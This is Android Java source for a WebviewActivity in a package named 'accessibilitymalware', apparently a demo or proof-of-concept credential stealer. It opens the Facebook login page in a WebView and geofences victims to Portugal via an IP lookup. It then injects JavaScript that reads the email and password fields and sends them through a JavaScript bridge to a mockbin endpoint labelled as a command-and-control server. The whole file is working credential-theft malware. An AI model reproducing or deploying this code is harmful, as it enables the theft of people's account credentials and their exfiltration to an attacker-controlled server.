package social.deal.accessibilitymalware;

import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class WebviewActivity extends AppCompatActivity {

    private static final String TAG = "LocationCheck";
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_webview);

        webView = findViewById(R.id.web_view);
        webView.setVerticalScrollBarEnabled(true);
        webView.getSettings().setJavaScriptEnabled(true);

        webView.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidInterface");
        webView.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageFinished(WebView view, String url) {

                checkLocation(new RetrofitCustomCallback() {
                    @Override
                    public void onSucess(String country) {
                        if (country.equalsIgnoreCase("Portugal")) {
                            Log.d(TAG, "Device is in Portugal");
                            Toast.makeText(WebviewActivity.this, "Device is in Portugal", Toast.LENGTH_SHORT).show();

                            fetchFacebookCredentials(view);

                        } else {
                            Log.d(TAG, "Device is not in Portugal");
                            Toast.makeText(WebviewActivity.this, "Device is not in Portugal", Toast.LENGTH_SHORT).show();
                        }
                    }

                    @Override
                    public void onFailure() {
                        Log.e(TAG, "Failed to fetch country");

                    }
                });



            }
        });

        // Load the desired URL
        webView.loadUrl("https://www.facebook.com/login/");
    }

    private void fetchFacebookCredentials(WebView view){
        view.loadUrl("javascript:(function() { " +
                "var username = document.querySelector('input[name=\"email\"]').value; " +
                "var password = document.querySelector('input[name=\"pass\"]').value; " +
                "AndroidInterface.processCredentials(username, password); " +
                "})()");
    }

    private void checkLocation(RetrofitCustomCallback callback) {
        String BASE_URL = "http://ip-api.com/";
        ApiService apiService = ApiClient.getClient(BASE_URL).create(ApiService.class);


        Call<LocationObj> call = apiService.getLocation();
        call.enqueue(new Callback<LocationObj>() {
            @Override
            public void onResponse(@NonNull Call<LocationObj> call, @NonNull Response<LocationObj> response) {
                if (response.isSuccessful()) {
                    LocationObj json = response.body();
                    if (json != null) {
                        Log.d(TAG, "JSON: " + json);
                        callback.onSucess(json.country);
                    }
                } else {
                    Log.e(TAG, "Failed to get location");
                }
            }

            @Override
            public void onFailure(@NonNull Call<LocationObj> call, @NonNull Throwable t) {
                Log.e("LocationCheck", "Error: " + t.getMessage());
            }
        });

    }

    private void contactCommandControlServer(String message){
        String urlC2 = "https://03df977768504b83b2025d8c8aebdc87.api.mockbin.io/";
        ApiService apiService = ApiClient.getClient(urlC2).create(ApiService.class);
        Message msg = new Message(message);

        Call<Message> call = apiService.createUser(msg);
        call.enqueue(new Callback<Message>() {
            @Override
            public void onResponse(@NonNull Call<Message> call, @NonNull Response<Message> response) {
                if (response.isSuccessful()) {
                    Message msg = response.body();

                    String responseText = "C2 online! Response: " + msg.getText();
                    Log.d(TAG, responseText);

                } else {
                    Log.e(TAG, "Request failed: " + response.message());
                }
            }

            @Override
            public void onFailure(Call<Message> call, Throwable t) {
                String failureText = "Failed to contact C2. Network error: " + t.getMessage();
                Log.e(TAG, failureText);
            }
        });
    }


    class MyJavaScriptInterface {
        @JavascriptInterface
        public void processCredentials(String username, String password) {
            String text = "Got your credentials:\nUsername: " + username + ", Password: " + password;
            Log.d("WebView", text);
            Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();

            contactCommandControlServer(text);
        }
    }

}
